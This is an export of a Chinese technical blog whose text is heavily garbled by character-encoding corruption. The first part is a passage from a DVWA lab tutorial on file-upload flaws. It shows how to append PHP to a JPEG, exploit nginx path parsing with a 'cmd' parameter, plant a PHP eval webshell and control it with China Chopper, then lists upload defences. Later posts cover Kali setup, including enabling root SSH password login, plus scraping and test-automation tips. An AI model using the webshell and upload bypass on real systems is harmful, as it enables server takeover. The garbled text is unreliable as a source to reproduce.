å›¾ç‰‡æ–‡ä»¶ï¼Œå’Œå‰é¢åˆ›å»ºçš„ 1.php æœ¨é©¬æ–‡ä»¶ç»“åˆåœ¨ä¸€èµ·ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„ 2.jpg æ–‡ä»¶ã€‚æ‰“å¼€cmdå‘½ä»¤è¡Œåœ¨å½“å‰è·¯å¾„ä¸‹æ‰§è¡Œæ‹¼æ¥æ–‡ä»¶çš„å‘½ä»¤ 1copy 1.jpg&#x2F;b+1.php&#x2F;a 2.jpg è¿™ä¸ª 2.jpg æ–‡ä»¶å¯ä»¥æ­£å¸¸åŒå‡»æ‰“å¼€ï¼Œä¸æ™®é€šå›¾ç‰‡çœ‹èµ·æ¥æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä½†æ˜¯ç”¨è®°äº‹æœ¬æ‰“å¼€è¿™å¼ å›¾ç‰‡è§‚å¯Ÿæœ€åé¢å°±ä¼šå‘ç°æˆ‘ä»¬çš„phpä»£ç  ç›´æ¥ä¸Šä¼ æ–°å»ºçš„ 2.jpg æ–‡ä»¶å°±å¯ä»¥ä¸Šä¼ æˆåŠŸäº†ã€‚ æ¼æ´åˆ©ç”¨1. åŒ…å« webshell æœ¨é©¬çš„ php æ–‡ä»¶å‰é¢åœ¨ low å’Œ medium å®‰å…¨ç­‰çº§ä¸­éƒ½æˆåŠŸä¸Šä¼ äº† 1.php æ–‡ä»¶ä¸”æ˜¾ç¤ºäº†å­˜å‚¨çš„ç›¸å¯¹è·¯å¾„ï¼Œå°†ç›¸å¯¹è·¯å¾„å¡«å†™åˆ°å½“å‰urlçš„åé¢å¹¶è¯·æ±‚ï¼Œå› ä¸ºå®ƒæ˜¯è„šæœ¬æ–‡ä»¶ï¼Œæ‰€ä»¥æœåŠ¡å™¨ä¼šç›´æ¥è§£æï¼Œä½†æ˜¯å‘ç°è§£ææŠ¥é”™äº†ã€‚ åŸå› æ˜¯è¿˜æ²¡æœ‰ä¼ é€’å‚æ•°ï¼Œæ¶æ„æœ¨é©¬ä¸­ä½¿ç”¨çš„æ˜¯ get è¯·æ±‚ï¼Œå‚æ•°æ˜¯ cmd ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦åœ¨è¯·æ±‚urlçš„åé¢åŠ ä¸Šå‚æ•°ï¼Œå¦‚ä¸‹é¢å‡ ä¸ªä¾‹å­ 1.æŸ¥çœ‹ phpinfo ä¿¡æ¯ 2.æŸ¥çœ‹æœåŠ¡å™¨å½“å‰ç³»ç»Ÿç”¨æˆ·ï¼ˆé€šè¿‡PHPå†…ç½®å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼‰ 3.éå†ç›®å½• æ³¨æ„ï¼šæœ€åé¢çš„åˆ†å·ä¸è¦å¿˜è®°ï¼Œphpä»£ç å—æ˜¯ä»¥åˆ†å·ç»“å°¾ã€‚ 2. åŒ…å« webshell æœ¨é©¬çš„å›¾ç‰‡æ–‡ä»¶å°†ä¸Šä¼ çš„å¸¦æœ‰æ¶æ„è„šæœ¬çš„å›¾ç‰‡ç›¸å¯¹è·¯å¾„ç›´æ¥å¡«å†™åˆ°å½“å‰urlåé¢å¹¶è¯·æ±‚ï¼Œå› ä¸ºæ˜¯å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰€ä»¥æœåŠ¡å™¨ä¼šå°†å›¾ç‰‡å±•ç¤ºå‡ºæ¥ï¼Œè€Œä¸ä¼šè§£æå®ƒé‡Œé¢çš„æ¶æ„ä»£ç ã€‚ æŒ‰ç…§å‰é¢çš„æ–¹æ³•åœ¨URLåé¢åŠ ä¸Šå‚æ•°å¹¶è¯·æ±‚å‘ç°æœåŠ¡å™¨æ²¡æœ‰æŠŠå®ƒå½“æˆè„šæœ¬æ¥è§£æï¼Œä»ç„¶æ˜¾ç¤ºçš„å›¾ç‰‡æœ¬èº«ã€‚å¦‚æœè¢«æ”»å‡»æœåŠ¡å™¨çš„webæœåŠ¡å™¨æ˜¯ nginx çš„è¯ï¼Œnginxæœ‰ä¸€ä¸ªè§£ææ¼æ´ï¼Œå°±æ˜¯åªè¦ä¸€ä¸ªè¯·æ±‚æœ€åé¢çš„åç¼€åæ˜¯è„šæœ¬æ ¼å¼çš„æ—¶å€™ï¼Œä»–å°±ä¼šæŠŠæ•´ä¸ªç¨‹åºå½“ä½œè„šæœ¬æ¥æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬æ„é€ è¿™æ ·çš„ url 1http:&#x2F;&#x2F;192.168.1.150&#x2F;DVWA-master&#x2F;hackable&#x2F;uploads&#x2F;2.jpg&#x2F;2222.php å‰é¢æ˜¯å›¾ç‰‡çš„åœ°å€ï¼Œåé¢åŠ ä¸Š /xxx.php , xxx å¯ä»¥éšä¾¿å¡«å†™ï¼Œé‡è¦çš„æ˜¯è¦æŠŠæ•´ä¸ªè¯·æ±‚æœ€åçš„åç¼€åè®¾ç½®æˆ .php, ç„¶åå†åŠ ä¸Šå‚æ•°ï¼Œå®Œæ•´å¦‚ä¸‹ 1http:&#x2F;&#x2F;192.168.1.150&#x2F;DVWA-master&#x2F;hackable&#x2F;uploads&#x2F;2.jpg&#x2F;2222.php?cmd&#x3D;phpinfo(); è¿™æ ·å†å»è¯·æ±‚ï¼ŒæœåŠ¡å™¨å°±ä¼šæŠŠæˆ‘ä»¬ä¸Šä¼ çš„å¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„ 2.jpg å›¾ç‰‡å½“ä½œè„šæœ¬æ¥æ‰§è¡Œï¼Œè¿”å›ç»“æœä¸Šé¢éƒ¨åˆ†çš„ä¹±ç æ˜¯å›¾ç‰‡ä¿¡æ¯ï¼ŒæŠŠæµè§ˆå™¨æ»šåŠ¨æ¡å¾€ä¸‹æ‹‰å°±èƒ½çœ‹åˆ°å‚æ•°è¯·æ±‚çš„ä¿¡æ¯ã€‚ 3. post webshellå¦‚æœæ„é€ çš„ webshell æ˜¯postè¯·æ±‚æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªæ¼æ´å‘¢ 1&lt;?php eval($_POST[\"cmd\"]);?&gt; ä¸Šä¼ æ–‡ä»¶è¿‡ç¨‹æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯åœ¨åˆ©ç”¨æ¼æ´çš„æ—¶å€™éœ€è¦ä»¥postçš„æ–¹å¼æäº¤è¯·æ±‚ï¼Œè¿™é‡Œä½¿ç”¨ hackbar æ’ä»¶æ–¹ä¾¿æ“ä½œ â€œä¸­å›½èœåˆ€â€ä¸Šä¼ äº† webshell åï¼Œæ‰‹åŠ¨åœ¨æµè§ˆå™¨è·å–ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯ã€éå†ç›®å½•ç»“æ„è¿˜æ˜¯å¾ˆéº»çƒ¦ï¼Œå¹¶ä¸”æœ‰ä¸€å®šçš„è¿æ°”æˆåˆ†ï¼Œä¾‹å¦‚ webæœåŠ¡å™¨æ˜¯nginxæ˜¯çŒœæµ‹çš„ï¼Œå¦‚æœæ˜¯ apacheã€IIS çš„è¯å°±å¾—ç»§ç»­çŒœè§£å°è¯•å…¶ä»–æ‰¾æ¼æ´çš„æ–¹æ³•äº†ï¼Œâ€ä¸­å›½èœåˆ€â€ è¿™ä¸ªè½¯ä»¶å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåªè¦çŸ¥é“åŒ…å«webshellæœ¨é©¬æ–‡ä»¶çš„è·¯å¾„å’Œè¯·æ±‚å‚æ•°å³å¯ï¼Œå‰©ä¸‹çš„å®ƒä¼šè‡ªåŠ¨å¤„ç†ã€‚ æ‰“å¼€ä¸»é¡µé¢ï¼Œå³é”®ç‚¹å‡»æ·»åŠ ï¼Œå¡«å†™webshellåœ°å€ï¼Œå‚æ•°åç­‰ä¿¡æ¯å¹¶ä¿å­˜ åœ¨ä¿å­˜çš„è¿™æ¡æ•°æ®å³é”®æ‰“å¼€â€æ–‡ä»¶ç®¡ç†â€ï¼Œç¬¬ä¸€æ¬¡è¿æ¥é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œå¤§æ¦‚10ç§’å·¦å³ï¼Œç„¶åå°±å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨çš„ç›®å½•ç»“æ„äº† ä¹Ÿå¯ä»¥åœ¨è¿™æ¡æ•°æ®ä¸Šå³é”®æ‰“å¼€â€è™šæ‹Ÿç»ˆç«¯â€ï¼Œå¯ä»¥åœ¨å‘½ä»¤è¡Œä¸‹æ“ä½œè·å–ä¿¡æ¯ æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„é˜²å¾¡çŸ¥é“äº†æ–‡ä»¶ä¸Šä¼ æ¼æ´äº§ç”Ÿçš„è¿‡ç¨‹å’ŒåŸå› ï¼Œåœ¨é…ç½®ç¯å¢ƒå’Œç¼–å†™ä»£ç çš„æ—¶å€™å°±å¯ä»¥ä»ä»¥ä¸‹æ–¹é¢æ¥é¿å…æ¼æ´çš„äº§ç”Ÿã€‚ 1.æ£€æŸ¥æ–‡ä»¶æ‰©å±•åï¼ˆé˜²æ­¢æœåŠ¡å™¨ä»¥éå›¾ç‰‡æ ¼å¼æ¥è§£ææ–‡ä»¶ï¼‰2.æ£€æŸ¥æ–‡ä»¶MIMEï¼ˆä¾‹å¦‚jpeã€jpgã€jpegç­‰åç¼€çš„æ–‡ä»¶å¯¹åº”çš„ç±»å‹éƒ½æ˜¯ image/jpegï¼‰3.æ£€æµ‹æ–‡ä»¶å†…å®¹ï¼ˆé˜²æ­¢æ–‡ä»¶ä¸­åŒ…å«webshellï¼‰4.å°†ä¸Šä¼ çš„æ–‡ä»¶é‡å‘½åï¼ˆé˜²æ­¢æ”»å‡»è€…é€šè¿‡æ–‡ä»¶åçŒœè§£webshellè·¯å¾„ï¼‰5.å­˜å‚¨æœåŠ¡å™¨å’Œä¸šåŠ¡æœåŠ¡å™¨åˆ†ç¦»6.å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ï¼ˆå½»åº•æ¸…é™¤ä¸Šä¼ æ–‡ä»¶ä¸­åŒ…å«çš„webshellï¼‰7.å°½å¯èƒ½é¿å…æ–‡ä»¶å­˜å‚¨çš„è·¯å¾„è¢«æ³„éœ²ï¼ˆä¾‹å¦‚ä¸è¦åœ¨è¯·æ±‚å“åº”ä¸­åŒ…å«ä¸Šä¼ åœ°å€ï¼‰","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"kali linux æ— æ³•ä¸Šç½‘è§£å†³åŠæ³•","slug":"kali linuxæ— æ³•è”ç½‘è§£å†³åŠæ³•","date":"2019-11-27T04:00:00.000Z","updated":"2019-11-27T02:33:58.691Z","comments":true,"path":"2019/11/27/kali linuxæ— æ³•è”ç½‘è§£å†³åŠæ³•/","link":"","permalink":"http://yoursite.com/2019/11/27/kali%20linux%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","excerpt":"","text":"æ–°å®‰è£…çš„ kali linux æ— æ³•è¿æ¥ç½‘ç»œï¼ŒæŸ¥çœ‹å¾—çŸ¥ eth0 ç½‘å¡æ²¡æœ‰å·¥ä½œã€‚ 1. VMware è™šæ‹Ÿæœºè®¾ç½® NAT æ¨¡å¼ä¸æ˜¯è™šæ‹Ÿæœºçš„è¯ä¸ç”¨ç®¡è¿™ä¸€æ­¥ 2. æŸ¥çœ‹ kali ç½‘ç»œé…ç½®1ifconfig -a å¯ä»¥å‘ç°ç½‘å¡ eth0 æ²¡æœ‰æ­£å¸¸å·¥ä½œï¼Œæ²¡æœ‰é…ç½® IP 3. ä¿®æ”¹ç½‘ç»œé…ç½®æ–‡ä»¶1vim /etc/network/interfaces åœ¨ interfaces æ–‡ä»¶æœ€ä¸‹æ–¹æ·»åŠ è¿™ä¸¤è¡Œ 12auto eth0iface eth0 inet dhcp ä¿®æ”¹å®Œæˆåä¿å­˜é€€å‡ºï¼Œå¹¶é‡å¯ç³»ç»Ÿã€‚æ­¤æ—¶ ifconfig å‘½ä»¤æŸ¥çœ‹ eth0 ç½‘å¡å·²ç»æ­£å¸¸å·¥ä½œï¼Œç½‘ç»œè¿æ¥æ­£å¸¸ã€‚","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"Python å¤šçº¿ç¨‹å¤„ç†ä»»åŠ¡ (çˆ¬è™«ä¸ºä¾‹)","slug":"Python å¤šçº¿ç¨‹å¤„ç†ä»»åŠ¡ (çˆ¬è™«ä¸ºä¾‹)","date":"2019-11-05T04:00:00.000Z","updated":"2019-11-05T14:08:03.103Z","comments":true,"path":"2019/11/05/Python å¤šçº¿ç¨‹å¤„ç†ä»»åŠ¡ (çˆ¬è™«ä¸ºä¾‹)/","link":"","permalink":"http://yoursite.com/2019/11/05/Python%20%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%A4%84%E7%90%86%E4%BB%BB%E5%8A%A1%20(%E7%88%AC%E8%99%AB%E4%B8%BA%E4%BE%8B)/","excerpt":"","text":"è¿™ç¯‡æ–‡ç« ä¸»è¦è®²ä¸€ä¸‹ä½¿ç”¨ Python çš„ threading åº“è¿›è¡Œå¤šçº¿ç¨‹ä»»åŠ¡ï¼Œæœ¬æ–‡ä»¥ä¸€ä¸ªçˆ¬è™«ä¸ºä¾‹ã€‚ çˆ¬è™« DEMOä¸‹é¢æ˜¯ä¸€ä¸ªç™¾åº¦æœç´¢çš„ç¤ºä¾‹ï¼Œä½¿ç”¨ requests + BeautifulSoup é‡‡é›†æŒ‡å®šå…³é”®è¯æŒ‡å®šé¡µæ•°çš„ç»“æœæ ‡é¢˜ã€‚å°è£…çš„æ–¹æ³•æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯èµ·å§‹é¡µç (int)ï¼Œç»“æŸé¡µç (int)ï¼Œè¦æœç´¢çš„å…³é”®è¯(str)ã€‚ 123456789101112131415161718def baidu_search(start_num,end_num,keyWord): ''' é‡‡é›†ç™¾åº¦æœç´¢ç»“æœçš„æ ‡é¢˜ :param start_num: èµ·å§‹é¡µç  :param end_num: ç»“æŸé¡µç  :param keyWord: æœç´¢çš„å…³é”®è¯ ''' for i in range(start_num,end_num): url = 'https://www.baidu.com/s?wd=%s&amp;pn=%d'% (keyWord,i*10) headers = &#123; 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36' &#125; r = requests.get(url,headers=headers).text # è·å–æºç  soup = BeautifulSoup(r,'lxml') # BeautifulSoup è§£æ result = soup.select('div.result.c-container &gt; h3 &gt; a') # é€šè¿‡ css selector å®šä½æŸ¥è¯¢ç»“æœæ‰€åœ¨å…ƒç´ ï¼Œè¿”å›ç»“æœæ˜¯ä¸ªåˆ—è¡¨ for i in result: title = i.text # é€šè¿‡ .text æ–¹æ³•è·å–å…ƒç´ å†…çš„æ–‡æœ¬ print(title) è¿™é‡Œä¸è¯¦ç»†ä»‹ç»é‡‡é›†çš„ä»£ç ã€‚ éå¤šçº¿ç¨‹é‡‡é›†å…ˆä¸ä½¿ç”¨å¤šçº¿ç¨‹ï¼Œç›´æ¥è°ƒç”¨é‡‡é›†å‡½æ•°çœ‹ä¸€ä¸‹é‡‡é›† 200 é¡µæ‰€ç”¨çš„æ—¶é—´ã€‚ 123456if __name__ == '__main__': start = time.time() baidu_search(0,200,'python') # é‡‡é›†0è‡³200é¡µçš„æ•°æ®ï¼Œæœç´¢å…³é”®è¯æ˜¯ python end = time.time() print('\\né‡‡é›†æ€»å…±è€—æ—¶ï¼š' + str(int(end - start)) + ' ç§’') ä»æ§åˆ¶å°è¾“å‡ºå¯ä»¥çœ‹åˆ°é‡‡é›† 0-200 é¡µçš„æ•°æ®ï¼Œå…±è€—æ—¶ 153 ç§’ã€‚ 1é‡‡é›†æ€»å…±è€—æ—¶ï¼š153 ç§’ å¤šçº¿ç¨‹é‡‡é›†é¦–å…ˆå¯¼å…¥ threading æ¨¡å—ã€‚ 1import threading åˆ›å»ºä¸€ä¸ªæ•°ç»„ threads, æ·»åŠ ä¸€ä¸ªçº¿ç¨‹ t1ï¼Œä½¿ç”¨ threading.Thread() æ–¹æ³•ã€‚target å‚æ•°ä¼ å…¥çš„æ˜¯ä¸Šé¢å†™çš„ç™¾åº¦çˆ¬è™«çš„å‡½æ•° baidu_searchï¼Œæ³¨æ„æ–¹æ³•åé¢ä¸éœ€è¦åŠ æ‹¬å·ã€‚args å‚æ•°ä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¾æ¬¡æ˜¯baidu_searå‡½æ•°éœ€è¦çš„ä¸‰ä¸ªå‚æ•° 123threads = []t1 = threading.Thread(target=baidu_search,args=(0ï¼Œ100ï¼Œ'python'))threads.append(t1) åŒæ ·çš„æ–¹æ³•å†åˆ›å»º t2ã€t3 ä¸¤ä¸ªçº¿ç¨‹ï¼Œå¹¶è£…åˆ° threads æ•°ç»„ã€‚ä»ç„¶æ˜¯è°ƒç”¨baidu_searchå‡½æ•°ï¼Œä¸è¿‡ args å‚æ•°çš„èµ·æ­¢é¡µç ç¨å¾®ä¿®æ”¹ï¼Œä¸è¦é‡å¤é‡‡é›†, è¿™ä¸‰ä¸ªçº¿ç¨‹é‡‡é›†çš„é¡µç æ€»æ•°ä»ç„¶æ˜¯200é¡µã€‚ 1234t2 = threading.Thread(target=baidu_search,args=(100ï¼Œ150ï¼Œ'python'))threads.append(t2)t3 = threading.Thread(target=baidu_search,args=(150ï¼Œ200ï¼Œ'python'))threads.append(t3) é€šè¿‡ for å¾ªç¯éå†æ•°ç»„ã€‚ 123456for t in threads: t.setDaemon(True) # å°†çº¿ç¨‹å£°æ˜ä¸ºå®ˆæŠ¤çº¿ç¨‹ï¼Œå¿…é¡»åœ¨start() æ–¹æ³•è°ƒç”¨ä¹‹å‰è®¾ç½®ï¼Œå¦‚æœä¸è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹ç¨‹åºä¼šè¢«æ— é™æŒ‚èµ·ã€‚ t.start() # å¼€å¯çº¿ç¨‹for t in threads: t.join() # ç”¨äºç­‰å¾…çº¿ç¨‹ç»ˆæ­¢ æ³¨ï¼šjoin() çš„ä½œç”¨æ˜¯ï¼Œåœ¨å­çº¿ç¨‹å®Œæˆè¿è¡Œä¹‹å‰ï¼Œè¿™ä¸ªå­çº¿ç¨‹çš„çˆ¶çº¿ç¨‹å°†ä¸€ç›´è¢«é˜»å¡ã€‚é˜²æ­¢ä¸»çº¿ç¨‹æ‰§è¡Œå®Œç»“æŸï¼Œå¯¼è‡´å­çº¿ç¨‹ä¹Ÿç»ˆæ­¢ã€‚ ä½¿ç”¨ä¸‰ä¸ªçº¿ç¨‹é‡‡é›†æ¥çœ‹ä¸€ä¸‹æ•ˆæœ 1é‡‡é›†æ€»å…±è€—æ—¶ï¼š65 ç§’ ä»æ§åˆ¶å°è¾“å‡ºçš„ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œä¸‰ä¸ªçº¿ç¨‹é‡‡é›† 200 é¡µåªç”¨äº† 65 ç§’ å°è£…å¤šçº¿ç¨‹å¦‚æœè¦å¼€å¯æ›´å¤šçš„çº¿ç¨‹ï¼Œæ‰‹åŠ¨ä¸€ä¸ªä¸ªæ·»åŠ å°±å¾ˆéº»çƒ¦äº†ï¼Œç”¨å‡½æ•°å°è£…ä¸€ä¸‹ã€‚ 1234567891011121314151617181920def baidu_dx(all_num,thread_num,keyWord): ''' å¤šçº¿ç¨‹é‡‡é›†ç™¾åº¦æœç´¢ç»“æœçš„æ ‡é¢˜ :param all_num: è¦é‡‡é›†çš„æ€»é¡µæ•° :param thread_num: è¦å¼€å¯çš„çº¿ç¨‹æ•° :param keyWord: æœç´¢çš„å…³é”®è¯ ''' per_num = int(all_num / thread_num) # æ¯ä¸ªçº¿ç¨‹å¤„ç†çš„ä»»åŠ¡æ•°é‡ threads = [] # å¼€å¯çš„çº¿ç¨‹æ”¾åˆ°ä¸€ä¸ªåˆ—è¡¨ for i in range(thread_num): t = threading.Thread(target=baidu_search, args=(i*per_num,i*per_num+per_num,keyWord)) threads.append(t) for t in threads: t.setDaemon(True) t.start() for t in threads: t.join() è°ƒç”¨æŸ¥çœ‹ä¸€ä¸‹æ•ˆæœ 12345if __name__ == '__main__': start = time.time() baidu_dx(200,10,'python') # é‡‡é›†200é¡µçš„æ•°æ®ï¼Œå¼€10ä¸ªçº¿ç¨‹ï¼Œæœç´¢å…³é”®è¯æ˜¯ python end = time.time() print('\\né‡‡é›†æ€»å…±è€—æ—¶ï¼š' + str(int(end - start)) + ' ç§’') 1é‡‡é›†æ€»å…±è€—æ—¶ï¼š23 ç§’ ä»æ§åˆ¶å°è¾“å‡ºçš„ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯ 10 ä¸ªçº¿ç¨‹é‡‡é›† 200 é¡µåªç”¨äº† 23 ç§’","categories":[{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"å¤šçº¿ç¨‹","slug":"å¤šçº¿ç¨‹","permalink":"http://yoursite.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}]},{"title":"Kali Linuxä½¿ç”¨SSHè¿œç¨‹ç™»é™†è¿æ¥","slug":"kali linixä½¿ç”¨SSHè¿œç¨‹ç™»é™†è¿æ¥","date":"2019-10-18T04:00:00.000Z","updated":"2019-10-18T11:24:48.696Z","comments":true,"path":"2019/10/18/kali linixä½¿ç”¨SSHè¿œç¨‹ç™»é™†è¿æ¥/","link":"","permalink":"http://yoursite.com/2019/10/18/kali%20linix%E4%BD%BF%E7%94%A8SSH%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%E8%BF%9E%E6%8E%A5/","excerpt":"","text":"æ–°å®‰è£…çš„ Kali Linux ä¸èƒ½ç›´æ¥ä½¿ç”¨SSHå·¥å…·æ¥è¿œç¨‹ç™»é™†ï¼Œæœ‰äº›å‚æ•°éœ€è¦åšä»¥ä¸‹ä¿®æ”¹ã€‚ ä¿®æ”¹ sshd_config æ–‡ä»¶ä¸­çš„å‚æ•°å‘½ä»¤ï¼švim /etc/ssh/sshd_configå°† PermitRootLogin çš„æ³¨é‡Šè§£é™¤ï¼Œå¹¶å°†å€¼è®¾ç½®ä¸º yes å°† PasswordAuthentication çš„æ³¨é‡Šè§£é™¤ï¼Œå¹¶å°†å€¼è®¾ç½®ä¸º yes ä¿å­˜å¹¶é€€å‡ºvim å¼€å¯SSHæœåŠ¡å‘½ä»¤ï¼šservice ssh start æŸ¥çœ‹ ssh æœåŠ¡è¿è¡ŒçŠ¶æ€å‘½ä»¤ï¼šservice ssh status ä½¿ç”¨Xshellç­‰å·¥å…·è¿œç¨‹è¿æ¥kali","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"kali linux","slug":"kali-linux","permalink":"http://yoursite.com/tags/kali-linux/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"appiumï¼šé»˜è®¤60ç§’å…³é—­åº”ç”¨å¦‚ä½•è§£å†³","slug":"appiumï¼šé»˜è®¤60ç§’å…³é—­åº”ç”¨å¦‚ä½•è§£å†³","date":"2019-09-18T04:00:00.000Z","updated":"2019-09-19T01:29:39.054Z","comments":true,"path":"2019/09/18/appiumï¼šé»˜è®¤60ç§’å…³é—­åº”ç”¨å¦‚ä½•è§£å†³/","link":"","permalink":"http://yoursite.com/2019/09/18/appium%EF%BC%9A%E9%BB%98%E8%AE%A460%E7%A7%92%E5%85%B3%E9%97%AD%E5%BA%94%E7%94%A8%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/","excerpt":"","text":"åœ¨ä½¿ç”¨appiumåšå®‰å“è‡ªåŠ¨åŒ–çš„æ—¶å€™å‘ç°å¦‚æœAPPé•¿æ—¶é—´å¤„äºä¸€ä¸ªé¡µé¢ä¸åŠ¨APPå°±ä¼šè¢«è‡ªåŠ¨å…³é—­ã€‚æ§åˆ¶å°æ—¥å¿—æç¤ºinfo: [debug] We shut down because no new commands came in æŸ¥çœ‹æ–‡æ¡£å‘ç°appiumå¯åŠ¨ä¸€ä¸ªåº”ç”¨åçš„sessioné»˜è®¤å¤±æ•ˆæ—¶é—´æ˜¯60ç§’ï¼Œä¹Ÿå°±æ˜¯60ç§’å†…appiumæœåŠ¡æ²¡æœ‰æ¥æ”¶åˆ°ä»»ä½•å‘½ä»¤å°±ä¼šå…³é—­åº”ç”¨ã€‚è¿™ä¸ªå¤±æ•ˆæ—¶é—´åœ¨å¯åŠ¨appiumæœåŠ¡æ—¶å¯è®¾ç½®ï¼Œåœ¨å¯åŠ¨å‘½ä»¤åé¢ç›´æ¥åŠ --command-timeout 600 1appium --command-timeout 1200 ä¸Šé¢å‘½ä»¤åé¢çš„ 1200 å•ä½æ˜¯ç§’ï¼Œä¹Ÿå°±æ˜¯å°†sessionçš„é»˜è®¤å¤±æ•ˆæ—¶é—´è®¾ç½®ä¸º20åˆ†é’Ÿã€‚å¯åŠ¨åå¯ä»¥åœ¨æ§åˆ¶å°æ—¥å¿—ä¸­çœ‹åˆ°è®¾ç½®çš„æ—¶é—´","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"}]},{"title":"å‘½ä»¤è¡Œæ¥æ‰§è¡Œpython + seleniumè„šæœ¬éšè—ï¼šDevTools listening on ws...","slug":"python+seleniumå‘½ä»¤è¡Œæ‰§è¡Œéšè—æ—¥å¿—ä¿¡æ¯","date":"2019-08-31T04:00:00.000Z","updated":"2019-10-08T13:33:39.066Z","comments":true,"path":"2019/08/31/python+seleniumå‘½ä»¤è¡Œæ‰§è¡Œéšè—æ—¥å¿—ä¿¡æ¯/","link":"","permalink":"http://yoursite.com/2019/08/31/python+selenium%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%89%A7%E8%A1%8C%E9%9A%90%E8%97%8F%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF/","excerpt":"","text":"ä½¿ç”¨å‘½ä»¤è¡Œæ¥æ‰§è¡Œseleniumè„šæœ¬çš„æ—¶å€™ï¼Œæ§åˆ¶å°ä¼šæ˜¾ç¤ºä¸‹é¢çš„ä¸€æ¡ä¿¡æ¯ã€‚ 1DevTools listening on ws:&#x2F;&#x2F;127.0.0.1:5928&#x2F;devtools&#x2F;browser&#x2F;3db254ee-75ba-4ab2-ba24-dcb645ecf27f æƒ³è¦éšè—åªéœ€è¦åœ¨åŠ ä¸€ä¸ªå‚æ•°å³å¯ 1234from selenium import webdriveroptions.add_experimental_option('excludeSwitches', ['enable-logging'])driver = webdriver.Chrome(options=options) å‚è€ƒæ¥æºï¼šstackoverflow çš„å›ç­”","categories":[{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"selenium","slug":"selenium","permalink":"http://yoursite.com/tags/selenium/"}]},{"title":"aiohttpæŠ¥é”™ ImportErrorï¼šcannot import name 'Coroutine'","slug":"aiohttpæŠ¥é”™","date":"2019-08-17T04:00:00.000Z","updated":"2019-10-08T13:31:38.356Z","comments":true,"path":"2019/08/17/aiohttpæŠ¥é”™/","link":"","permalink":"http://yoursite.com/2019/08/17/aiohttp%E6%8A%A5%E9%94%99/","excerpt":"","text":"ä»Šå¤©å°†ä¹‹å‰çš„IPä»£ç†æ± copyåˆ°å…¶ä»–ç”µè„‘æ‰§è¡Œçš„æ—¶å€™æŠ¥å¦‚ä¸‹é”™è¯¯ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯aiohttpè¿™ä¸ªåº“æœ‰é—®é¢˜ï¼Œä½†æ˜¯åœ¨ä¹‹å‰çš„æœºå™¨ä¸Šè¿è¡Œæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ç‰ˆæœ¬ä¸åŒå¯¼è‡´ã€‚ aiohttp 